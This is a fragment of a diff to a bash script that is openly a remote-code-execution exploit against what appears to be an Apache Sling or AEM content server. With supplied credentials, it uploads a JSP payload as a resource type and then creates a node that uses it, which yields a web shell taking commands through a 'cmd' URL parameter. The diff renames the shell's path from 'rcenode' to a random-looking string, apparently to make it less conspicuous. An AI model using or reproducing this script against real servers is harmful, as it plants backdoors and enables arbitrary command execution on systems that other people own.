@@ -1,4 +1,4 @@
-#!/usr/bin/bash
+#!/bin/bash
 
 if [ "$#" -ne 3 ]; then
 	echo "Usage: $0 URL USERNAME PASSWORD"
@@ -35,6 +35,6 @@ echo "$payload" > /tmp/html.jsp
 curl -k -s -X POST -H "Referer: $url" -u "$username:$password" "$url/apps/rcetype" -Fhtml.jsp=@/tmp/html.jsp > /dev/null
 
 # Create rcenode
-curl -k -s -X POST -H "Referer: $url" -u "$username:$password" "$url/rcenode" -Fsling:resourceType=rcetype > /dev/null
+curl -k -s -X POST -H "Referer: $url" -u "$username:$password" "$url/drdnVgeh" -Fsling:resourceType=rcetype > /dev/null
 
-echo "Now navigate to $url/rcenode.html?cmd=ifconfig"
+echo "Now navigate to $url/drdnVgeh.html?cmd=ifconfig"
